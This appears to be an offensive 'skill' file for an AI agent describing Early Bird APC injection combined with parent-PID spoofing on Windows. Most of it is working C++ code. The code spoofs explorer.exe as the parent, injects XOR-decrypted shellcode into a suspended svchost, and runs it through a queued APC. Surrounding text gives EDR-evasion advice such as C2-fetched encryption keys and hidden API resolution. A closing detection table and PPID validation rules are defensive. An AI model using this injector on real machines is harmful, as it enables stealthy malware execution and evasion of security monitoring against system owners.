---
name: early-bird-apc-ppid-spoof
description: Early Bird APC injection with PPID spoofing -- CREATE_SUSPENDED child, QueueUserAPC before first instruction, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS for fake parent, XOR shellcode, RW→RX flip.
metadata:
  type: offensive
---

# Early Bird APC Injection + PPID Spoofing

Combines two evasion techniques into one injection primitive:
1. **Early Bird**: queue APC on the initial thread of a suspended child process before it
   executes any user-mode code -- the APC fires at the earliest possible moment during
   process initialization.
2. **PPID Spoofing**: create the child process with a spoofed parent PID so it appears to be
   a child of a trusted process (e.g., `explorer.exe`, `svchost.exe`).

## Why Early Bird

Normal APC injection requires the target thread to enter an alertable wait state. The initial
thread of a `CREATE_SUSPENDED` process hasn't run yet -- when `ResumeThread` is called, the
thread enters `ntdll!LdrInitializeThunk` which calls `NtTestAlert`, draining the APC queue
before any application code runs. This means:

- No race condition -- the APC fires deterministically
- No need to find an alertable thread -- the main thread always alerts during init
- Execution happens before the target process's own code, DLLs, or EDR hooks are loaded

## Attack Chain

```
1. Create PPID-spoofed suspended process
   ├─ InitializeProcThreadAttributeList(1 attribute)
   ├─ UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent)
   └─ CreateProcessA("C:\Windows\System32\svchost.exe", CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT)

2. Allocate RW memory in child
   └─ VirtualAllocEx(hProcess, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

3. Decrypt + write shellcode
   ├─ XOR-decrypt shellcode in local buffer
   └─ WriteProcessMemory(hProcess, remoteAddr, decrypted, size)

4. Flip RW → RX (never RWX)
   └─ VirtualProtectEx(hProcess, remoteAddr, size, PAGE_EXECUTE_READ)

5. Queue APC on main thread
   └─ QueueUserAPC((PAPCFUNC)remoteAddr, pi.hThread, 0)

6. Resume → APC fires during LdrInitializeThunk
   └─ ResumeThread(pi.hThread)
```

## Reference Implementation

```cpp
#include <windows.h>

// XOR key for shellcode decryption
static const uint8_t xor_key[] = { 0x41, 0x42, 0x43, 0x44 };

void xor_decrypt(uint8_t* buf, size_t len) {
    for (size_t i = 0; i < len; ++i)
        buf[i] ^= xor_key[i % sizeof(xor_key)];
}

DWORD find_pid(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

bool inject(uint8_t* shellcode, size_t sc_len) {
    // 1. Open parent for PPID spoof
    DWORD parent_pid = find_pid("explorer.exe");
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
    if (!hParent) return false;

    // 2. Set up extended startup info
    SIZE_T attr_size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
    auto attrs = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
    InitializeProcThreadAttributeList(attrs, 1, 0, &attr_size);
    UpdateProcThreadAttribute(attrs, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                              &hParent, sizeof(HANDLE), NULL, NULL);

    STARTUPINFOEXA si = {};
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attrs;
    PROCESS_INFORMATION pi = {};

    // 3. Create suspended child with spoofed parent
    if (!CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                        NULL, NULL, &si.StartupInfo, &pi))
        return false;

    // 4. Allocate RW, write, flip to RX
    xor_decrypt(shellcode, sc_len);
    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(pi.hProcess, remote, shellcode, sc_len, NULL);

    DWORD old;
    VirtualProtectEx(pi.hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old);

    // 5. Queue APC + resume
    QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);
    ResumeThread(pi.hThread);

    // Cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hParent);
    DeleteProcThreadAttributeList(attrs);
    HeapFree(GetProcessHeap(), 0, attrs);
    return true;
}
```

## Key Design Decisions

### RW → RX (Never RWX)

`PAGE_EXECUTE_READWRITE` is a major EDR signal. The two-step pattern:
1. Allocate as `PAGE_READWRITE` -- write shellcode
2. `VirtualProtectEx` to `PAGE_EXECUTE_READ` -- remove write

This avoids the RWX indicator. Some EDRs still flag `PAGE_EXECUTE_READ` on `MEM_PRIVATE`
regions, but the signal is weaker.

### XOR-Encrypted Shellcode

Storing shellcode as cleartext in the binary allows static signature matching. XOR with even
a simple key defeats static scanners. For stronger evasion:
- AES-256-CBC with key derived from environment (hostname hash, timestamp)
- RC4 with key from a remote C2 fetch
- Multi-layer: XOR outer + AES inner

### NTAPI Resolution via Stack Strings

To avoid import table exposure, resolve APIs at runtime:

```cpp
// Build "NtAllocateVirtualMemory" on the stack
char api[] = { 'N','t','A','l','l','o','c','a','t','e',
               'V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
auto fn = (NtAllocateVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll"), api);
```

Or use PEB walk (`lazy-importer-peb-walk` skill) to avoid `GetProcAddress` entirely.

## Detection

| Signal                                              | Source              |
|-----------------------------------------------------|---------------------|
| `CreateProcess` with `CREATE_SUSPENDED`             | Sysmon Event 1      |
| PPID mismatch (svchost child of non-services.exe)   | Sysmon Event 1      |
| `VirtualAllocEx` + `WriteProcessMemory` cross-proc  | ETW / Sysmon 10     |
| `QueueUserAPC` to a suspended thread                | ETW kernel provider |
| `MEM_PRIVATE | PAGE_EXECUTE_READ` in new process    | Memory scan         |
| Shellcode entropy > 7.0 in private executable page  | Heuristic scanner   |

### PPID Validation Rules

```
svchost.exe parent MUST be services.exe (PID from SCM)
csrss.exe   parent MUST be smss.exe
lsass.exe   parent MUST be wininit.exe

Any deviation = PPID spoof or compromise.
```

## Related Skills

- `apc-injection-detection` -- detection side of APC injection
- `process-hollowing-detection` -- alternative injection technique
- `lazy-importer-peb-walk` -- PEB-based API resolution without imports
- `windows-process-injection-memory` -- umbrella injection reference
